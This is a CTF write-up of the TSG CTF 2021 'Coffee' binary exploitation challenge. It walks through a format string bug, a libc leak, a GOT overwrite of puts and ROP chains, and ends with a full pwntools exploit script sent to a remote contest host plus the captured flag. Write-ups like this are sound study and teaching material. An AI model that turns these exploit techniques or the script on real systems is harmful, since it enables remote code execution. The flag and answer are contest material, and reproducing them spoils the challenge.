# Coffee

![](/2021/TSG-CTF/Coffee/images/1.png)

The challenge give a binary file, a c source code, a libc, and a start.sh

Look at the source code

```c
#include <stdio.h>

int x = 0xc0ffee;
int main(void) {
    char buf[160];
    scanf("%159s", buf);
    if (x == 0xc0ffee) {
        printf(buf);
        x = 0;
    }
    puts("bye");
}
```

I see that the program have the `printf(buf)` with cause a format string vul.

## Checking the ELF file

![](/2021/TSG-CTF/Coffee/images/2.png)

Program enable stack canary, NX, but not PIE

## Analysis

I have a format string vulnerability (fmt) in printf. I can write or leak what ever i want.

But after printf call, it set the global value x = 0, so if i want to call main back, and use fmt again, i need to reset value x to 0xc0ffee.

## My ideal

I can leak or overwrite something with fmt, but because the aslr, i didn’t know about the libc base, so if i want to use a technead need libc (ie ret2libc, one_gadget, ...) i need one time for leak and one time for exploit, but I mentioned before, global value X will prevent me to do that.

Checking the static ELF file, i cannot find anything can give me a shell. No win function, no system, no segment with both write and execute (to use shellcode) and not enough gadget for making a ropchain to call execve(“/bin/sh”, 0, 0).

So that I will need to use things in libc. So I need to find a way to set x = 0xc0ffee and call main back.

Note that i cannot use fmt to assign a value to x, because x = 0 is assigned after the printf statement, so this is meaningless.

![](/2021/TSG-CTF/Coffee/images/3.png)

## Leaking libc

I use a very simple way to leak libc base, leak the return address of main function, which is the address of `<__libc_start_main + 243>` (it depend on version of libc, I check it with the libc the author gived.

## Find way to set x = 0xc0ffee

I use ROPgadget to find the gaget can do that for me. Unfortunately, there is no mov [r64] r64 in the static ELF (because i don’t know about libc base in the first time attemp)

So next I look at the function and plt function, there is just one function that can give me input (or may be i couldn't find)

![](/2021/TSG-CTF/Coffee/images/4.png)

I can use the `scanf()` to input value to x, the format will `scanf(format, &x)`. 

![](/2021/TSG-CTF/Coffee/images/5.png)

2 gadget will help I to set paramater to scanf.

The next thing to do is find a valid format string to give to scanf. It can be scanf(“%d”, &x), scanf(“%s”, &x), scanf(“%8d”, &x), ...

There is a string “%159s” in the ELF i can use to give to scanf, but unfortunately, address of this string have the 0x20 and it will stop the scanf T_T.

![](/2021/TSG-CTF/Coffee/images/6.png)

Because the PIE is disable and the RELRO is not fully-relro, so i can overwrite to GOT table. So I decide to use the fmt to write “%s” in some static writeable memory in ELF. I chose to write it to the GOT segment

![](/2021/TSG-CTF/Coffee/images/7.png)

After write to address 0x404008 string “%s”, i just need to pop that to rdi using `pop rdi; ret`.

So that i have a rop_chain can help me set x = 0xc0ffee

`Ropchain = [pop rdi; ret][0x404008][pop rsi; pop r15; ret] [&x][0][scanf_plt]`

## Return to ropchain, and call main again

I already have the ropchain to set x, but how i can run it?

Look at source code again, because i didn’t know about stack base, to the puts() will be the only change to redirect code. I can use fmt to overwrite the puts_got, and make the program run our rop_chain.

There is a special gadget in the `libc_csu_init`, it is also my favorite gadget because it very useful in many case

![](/2021/TSG-CTF/Coffee/images/8.png)

Look at the stack if i overwrite the puts_got to the pop_6 gadget, and see what I mean

![](/2021/TSG-CTF/Coffee/images/9.png)

After the printf is call, the yellow part will overwrite puts_got and write string “%s” to another entry in GOT

When the function call puts (pop_6), the program push the return address of main in stack (green border). When it pop 6 time, it reach the red part, which is our payload, and call scanf(“%s”, &x), then return to main. I input “\xee\xff\xc0\x00” to set value of x.

I just added some ret_gadget to allign the stack (because i run in ubuntu 64 bit, so rsp & 0xf == 0 before calling function).

I think someone will ask me why I put 2 address for overwrite format string (blue part) at the end. The reason because pop_6 is the maximum amount i can pop, if I put it before the red part, I can not run a ROPchain.

## Getting the shell

So after i leak a libc, and use the ropchain to set x = 0xc0ffee and call main again, i can use the fmt bug again. In this time, i already know the libc base, so that is ez.

I just replace the ROPchain in previous step with

`[ret][ret][pop_rdi; ret][address of bin_sh in libc][system]`

to run system(“/bin/sh”) and get a shell. 2 ret_gadget in the beginnin because I don’t want to change puts_got to pop_4 again.

## Final exploit.

  - First, i input the string use for format string bug, i split it in 2 part, part 1 for leak libc, and overwrite puts_got to pop_6 and write string “%s” in another entry of GOT, part 2 is our ROPchain to call scanf(“%s”, &x) and ret to main.

  - Second, i input the string “\xee\xff\xc0\x00” into scanf

  - Third, calculate the system and /bin/sh from the libc_start_main leak and input the ropchain to get a shell

File [solve.py](/2021/TSG-CTF/Coffee/solve.py)

```python
from pwn import *

#s = process('./coffee')
#raw_input('DEBUG')

s = remote('34.146.101.4', 30002)

x_value = 0xc0ffee
x_address = 0x404048
puts_got = 0x404018
main = 0x401196
leak = '%29$llx'
leak_offset = 0x270b3
system_offset = 0x55410
bin_sh_offset = 0x1b75aa
writeable = 0x404008
scanf_plt = 0x4010a0
pop_rsi_r15 = 0x401291
pop_rdi = 0x401293
ret = 0x40101a
pop_6 = 0x40128a

payload = b'%020$n' + b'%29$llxA' + b'%4733x' + b'%19$hn' + b'%24731x' + b'%020$n' + b'\x00'

payload += p64(pop_rdi) + p64(writeable) + p64(pop_rsi_r15) + p64(x_address) + p64(0) + p64(scanf_plt) + p64(ret) + p64(main)
payload += p64(puts_got) + p64(writeable)

s.sendline(payload)

libc_base = int(s.recvuntil(b'A').decode('utf-8')[:-1], 16) - leak_offset

s.sendline(p32(x_value))

bin_sh = bin_sh_offset + libc_base
system = system_offset + libc_base

payload = b'A' * 31 + b'\x00'
payload += p64(ret) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)

s.sendline(payload)

s.interactive()
```

`flag: TSGCTF{Uhouho_gori_gori_pwn}`
